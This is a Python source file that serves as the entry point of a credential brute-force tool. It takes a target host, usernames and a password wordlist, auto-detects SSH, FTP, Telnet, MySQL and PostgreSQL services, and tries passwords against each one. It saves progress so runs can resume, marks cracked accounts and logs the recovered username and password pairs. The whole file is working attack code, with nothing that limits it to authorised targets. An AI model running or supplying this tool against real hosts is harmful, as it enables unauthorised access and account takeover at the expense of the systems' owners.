import time
import argparse
from typing import Optional, Dict, List
from core.scanner import detect_services
from core.utils import clear_line
from core.utils import (
    load_usernames_from_file,
    log_result,
    get_current_timestamp
)
from core.progress import (
    make_progress_path,
    read_progress,
    write_progress,
    remove_progress
)
from core.success import (
    make_success_path,
    write_success,
    success_exists
)
from settings import DEFAULT_USERNAMES
from config import (
    RESULT_LOG_FILE,
    RESULT_PATH,
    DEFAULT_PASSWORDS_FILE,
    LOGIN_FUNCS,
)


def entrypoint() -> None:
    """
    Main entry point for the brute-force tool. Parses command-line arguments,
    detects services, and attempts brute-force attacks. Supports per-protocol
    progress saving (line-based) and per-target success markers to skip already
    cracked accounts.
    """
    current_progress_path: Optional[str] = None
    current_line_index: int = 0

    try:
        parser = argparse.ArgumentParser(
            description="Brute-force tool for various services (SSH, FTP, Telnet, MySQL, PostgreSQL)."
        )
        parser.add_argument("host", help="Target host IP address")
        parser.add_argument(
            "username",
            nargs="*",
            default=DEFAULT_USERNAMES,
            help="One or more usernames (space-separated). If not provided -> DEFAULT_USERNAMES is used."
        )
        parser.add_argument(
            "wordlist",
            nargs="?",
            default=DEFAULT_PASSWORDS_FILE,
            help="Path to password wordlist file (optional). If not provided -> DEFAULT_PASSWORDS_FILE is used."
        )
        parser.add_argument(
            "--userfile",
            help="Path to a file with a list of usernames (one username per line). Takes precedence over username arguments.",
            default=None,
        )
        parser.add_argument(
            "--protocol",
            choices=["ssh", "ftp", "telnet", "mysql", "postgres", "auto"],
            default="auto",
            help="Protocol to brute-force (default: auto)"
        )
        parser.add_argument(
            "--port", type=int, help="Custom port for the selected service"
        )
        parser.add_argument("--output", help="Path to save JSON output", default=None)
        args = parser.parse_args()

        if args.userfile:
            usernames = load_usernames_from_file(args.userfile)
            if not usernames:
                print(f"[WARN] File {args.userfile} contains no usernames. Using default usernames.")
                usernames = DEFAULT_USERNAMES
        else:
            usernames = args.username or DEFAULT_USERNAMES

        print(f"[INFO] Starting brute-force attack on {args.host} for usernames: {usernames}")

        if args.protocol == "auto":
            detected: List[str] = detect_services(args.host)
            print(f"[INFO] Detected services: {detected}")
            if not detected:
                print("[WARN] No services detected on the host. Exiting.")
                return
        else:
            detected = [args.protocol]

        all_results: List[Dict[str, Optional[str] | bool]] = []

        for user in usernames:
            for proto in detected:
                result_template: Dict[str, Optional[str] | bool] = {
                    "timestamp": get_current_timestamp(),
                    "host": args.host,
                    "protocol": proto,
                    "success": False,
                    "username": user,
                    "password": None,
                }
                password: Optional[str] = None

                if proto not in LOGIN_FUNCS:
                    print(f"[WARN] Unknown protocol: {proto}, skipping.")
                    all_results.append(result_template.copy())
                    continue

                entry = LOGIN_FUNCS[proto]
                func = entry[0]
                default_port = entry[1] if len(entry) > 1 else 0
                if len(entry) >= 4:
                    delay = entry[2]
                    connection_timeout = entry[3]
                elif len(entry) == 3:
                    connection_timeout = entry[2]
                    delay = 0.5
                else:
                    connection_timeout = 3
                    delay = 0.5

                port = args.port or default_port
                wordlist_path = args.wordlist or DEFAULT_PASSWORDS_FILE

                progress_path = make_progress_path(wordlist_path, args.host, user, proto)
                success_path = make_success_path(wordlist_path, args.host, user, proto)

                current_progress_path = progress_path
                current_line_index = 0

                if success_exists(success_path):
                    print(f"[SKIP] {proto.upper()} user '{user}' already cracked earlier (success marker: {success_path}).")
                    all_results.append(result_template.copy())
                    current_progress_path = None
                    continue

                start_line = read_progress(progress_path)
                if start_line:
                    print(f"[INFO] Resuming {proto.upper()} for {user} from line {start_line} (progress file: {progress_path})")

                print(f"[INFO] Attempting {proto.upper()} brute-force for user '{user}' on host {args.host} port {port}... delay between attempts: {delay}s")

                try:
                    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wf:
                        for line_index, line in enumerate(wf):
                            if line_index < start_line:
                                continue

                            current_line_index = line_index
                            password_to_check = line.strip()
                            if not password_to_check:
                                try:
                                    write_progress(progress_path, line_index + 1)
                                except Exception:
                                    pass
                                continue

                            clear_line()
                            print(f"[?] Trying {proto.upper()} {user}:{password_to_check}", end="\r")

                            try:
                                try:
                                    password = func(
                                        args.host,
                                        user,
                                        password_to_check,
                                        port=port,
                                        timeout=connection_timeout,
                                        delay=delay
                                    )
                                except TypeError:
                                    password = func(
                                        args.host,
                                        user,
                                        password_to_check,
                                        port=port,
                                        timeout=connection_timeout
                                    )
                            except KeyboardInterrupt:
                                try:
                                    write_progress(progress_path, line_index)
                                except Exception:
                                    pass
                                print(f"\n[INFO] Interrupted by user. Progress saved to {progress_path}. Exiting gracefully...")
                                raise
                            except Exception as e:
                                print(f"\n[ERROR] Error during brute-force attempt ({proto}) for {user}: {e}")
                                password = None

                            try:
                                write_progress(progress_path, line_index + 1)
                            except Exception:
                                pass

                            if password:
                                try:
                                    write_success(success_path, password)
                                except Exception:
                                    pass
                                try:
                                    remove_progress(progress_path)
                                except Exception:
                                    pass

                                result = result_template.copy()
                                result.update({"success": True, "password": password})
                                log_path = RESULT_PATH + RESULT_LOG_FILE
                                try:
                                    log_result(result, log_path=log_path)
                                except Exception as e:
                                    print(f"[WARN] Failed to log result: {e}")
                                print(f"\n[SUCCESS] {proto.upper()} {user}:{password}")
                                all_results.append(result)
                                break

                            try:
                                time.sleep(delay)
                            except KeyboardInterrupt:
                                try:
                                    write_progress(progress_path, line_index + 1)
                                except Exception:
                                    pass
                                print(f"\n[INFO] Interrupted by user during sleep. Progress saved to {progress_path}. Exiting gracefully...")
                                raise
                        else:
                            print(f"\n[INFO] {proto.upper()} - no valid password found for {user}")
                            all_results.append(result_template.copy())

                except FileNotFoundError:
                    print(f"[ERROR] Wordlist not found: {wordlist_path}")
                    all_results.append(result_template.copy())
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    print(f"[ERROR] Unhandled error during brute force for {proto} {user}: {e}")
                    all_results.append(result_template.copy())
                finally:
                    current_progress_path = None
                    current_line_index = 0

        print(f"[INFO] Brute-force attack completed. Results saved to {RESULT_PATH}")

    except KeyboardInterrupt:
        print("\n[INFO] Exiting due to user interruption.")
        if current_progress_path is not None:
            try:
                write_progress(current_progress_path, current_line_index + 1)
                print(f"[INFO] Progress saved to {current_progress_path}")
            except Exception:
                print(f"[WARN] Failed to save progress to {current_progress_path}")
        if 'all_results' in locals() and all_results:
            print(f"[INFO] Partial results saved to {RESULT_PATH}")
        raise

    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
        if 'all_results' in locals() and all_results:
            print(f"[INFO] Partial results saved to {RESULT_PATH}")
        raise


if __name__ == "__main__":
    entrypoint()
